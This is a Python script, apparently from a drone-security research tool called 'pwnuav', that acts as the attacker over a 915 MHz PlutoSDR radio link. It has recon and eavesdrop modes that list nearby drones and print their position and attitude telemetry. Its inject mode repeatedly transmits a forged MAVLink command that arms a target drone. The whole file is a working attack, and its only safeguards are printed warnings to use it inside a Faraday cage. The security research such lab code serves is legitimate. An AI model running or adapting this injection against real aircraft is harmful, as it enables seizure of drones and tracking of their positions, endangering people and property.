#!/usr/bin/env python3
"""Attacker side (Pluto): recon / eavesdrop on RX, injection on TX. 915 MHz.

Runs the MAVLink-layer PoCs over the real RF link. Faraday cage ONLY.
Requires SoapySDR + SoapyPlutoSDR.
"""
from __future__ import annotations

import argparse

from pymavlink import mavutil

from pwnuav.rf.gfsk import FS
from pwnuav.rf.soapy_io import HAVE_SOAPY, SdrSink, SdrSource
from pwnuav.rf.transport import iq_to_messages, message_to_iq


def _listen(mode: str, freq: float, seconds: float) -> None:
    src = SdrSource(freq=freq, fs=FS, driver="plutosdr")
    mav = mavutil.mavlink.MAVLink(None)
    seen: set = set()
    n = int(seconds * 10)
    try:
        for _ in range(n):
            for msg in iq_to_messages(mav, src.recv(int(FS // 10))):
                t = msg.get_type()
                if mode == "recon" and t == "HEARTBEAT" and msg.get_srcSystem() not in seen:
                    seen.add(msg.get_srcSystem())
                    print(f"[+] drone sysid={msg.get_srcSystem()} type={msg.type} "
                          f"autopilot={msg.autopilot}")
                elif mode == "eavesdrop" and t in (
                        "GLOBAL_POSITION_INT", "ATTITUDE", "SYS_STATUS"):
                    print(f"[+] {t}: {msg.to_dict()}")
    finally:
        src.close()


def _inject(freq: float, target: int) -> None:
    mav = mavutil.mavlink.MAVLink(None, srcSystem=255, srcComponent=190)
    msg = mav.command_long_encode(
        target, 1, mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM, 0,
        1, 0, 0, 0, 0, 0, 0)
    tx = SdrSink(freq=freq, fs=FS, driver="plutosdr")
    try:
        for _ in range(20):
            tx.send(message_to_iq(mav, msg))
    finally:
        tx.close()
    print("[+] ARM injected")


def main() -> None:
    print("[!] Faraday cage ONLY, or cabled with attenuators. Never over-the-air.")
    ap = argparse.ArgumentParser(description="PWNUAV attacker over RF (Pluto)")
    ap.add_argument("mode", choices=["recon", "eavesdrop", "inject"])
    ap.add_argument("--freq", type=float, default=915e6)
    ap.add_argument("--seconds", type=float, default=5.0)
    ap.add_argument("--target", type=int, default=1)
    args = ap.parse_args()
    if not HAVE_SOAPY:
        raise SystemExit("SoapySDR not installed; cannot drive the radio.")
    if args.mode == "inject":
        _inject(args.freq, args.target)
    else:
        _listen(args.mode, args.freq, args.seconds)


if __name__ == "__main__":
    main()
